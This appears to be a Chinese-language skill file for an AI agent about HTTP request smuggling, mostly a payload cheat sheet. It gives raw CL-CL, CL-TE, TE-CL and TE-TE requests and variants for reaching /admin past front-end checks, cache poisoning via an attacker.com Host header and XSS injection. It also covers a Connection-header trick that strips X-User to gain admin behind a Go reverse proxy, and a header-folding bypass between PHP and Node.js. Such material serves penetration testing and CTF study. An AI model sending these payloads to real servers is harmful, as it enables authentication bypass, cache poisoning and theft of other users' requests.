---
name: smuggling
description: Use when encountering http请求走私攻击 - cl-cl、cl-te、te-cl、te-te攻击链
---

# HTTP请求走私

## Info

- **Domain**: web
- **Tags**: web, smuggling

## CL-CL (Content-Length差异)
```
POST / HTTP/1.1
Host: target.com
Content-Length: 44

GET /admin HTTP/1.1
Host: target.com


```

## CL-TE (Content-Length vs Transfer-Encoding)
```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

## TE-CL
```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
0


```

## TE-TE
```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: x

0

G
```

## 绕过前端安全
```
POST / HTTP/1.1
Host: target.com
Content-Length: 60

GET /admin HTTP/1.1
Host: target.com
Cookie: session=admin


```

## 缓存投毒
```
POST / HTTP/1.1
Host: target.com
Content-Length: 80
Transfer-Encoding: chunked

0

GET /static.js HTTP/1.1
Host: attacker.com
X-Inject: alert(1)


```

## 组合XSS
```
POST / HTTP/1.1
Host: target.com
Content-Length: 100

POST /comment HTTP/1.1
Host: target.com
Content-Length: 50

content=<script>alert(1)</script>
```

## 检测方法
```bash
# 使用Burp Suite
# 1. HTTP Request Smuggler插件
# 2. 手动发送不同Content-Length/TE的请求

# 时间差异检测
# 发送CL-TE请求，观察响应时间
```

## 常见利用场景
```
1. 绕过前端认证
2. 缓存投毒
3. 触发XSS
4. 窃取其他用户请求
5. 内网端口扫描
```

## Connection 头逐跳字段绕过

### 原理
RFC 2616 规定 `Connection` 头可指定逐跳（hop-by-hop）字段，代理在转发时必须删除这些字段：
```
Connection: close, Header1, Header2
```

### 利用场景：反向代理鉴权绕过

**架构**: 用户 → 鉴权服务器(Go代理) → 主服务器(Flask)
- 鉴权服务器从 JWT 提取 uid，设置 `X-User` 头转发给主服务器
- 主服务器从 `X-User` 判断用户身份，`X-User='0'` 为 admin

**攻击**:
```http
GET /dashboard HTTP/1.1
Host: target.com
Cookie: session=xxx; token=xxx
Connection: close,X-User
```

**效果**: Go 的 ReverseProxy 因 `Connection` 中包含 `X-User`，转发时会删除该头 → 主服务器 `request.headers.get('X-User', '0')` 返回 `'0'` → 判定为 admin。

### 不同框架的请求头解析差异

| 框架 | 头字段规范化 | 头折叠处理 |
|------|-------------|-----------|
| PHP `getallheaders()` | 保留原始格式 | 不合并，视为独立字段 |
| Flask (werkzeug) | 首字母大写 | 自动合并不规范字段 |
| Express (Node.js) | 全部转小写 | 自动合并不规范字段 |

**利用示例**: PHP 前端过滤 + Node.js 后端验证
```
# 请求头
admin: x
 true: y

# PHP 解析: {"admin": "x", " true": "y"}  → 检测不到 admin 含 true
# Node.js 解析: {"admin": "x true: y"}     → admin 包含 true → 绕过
```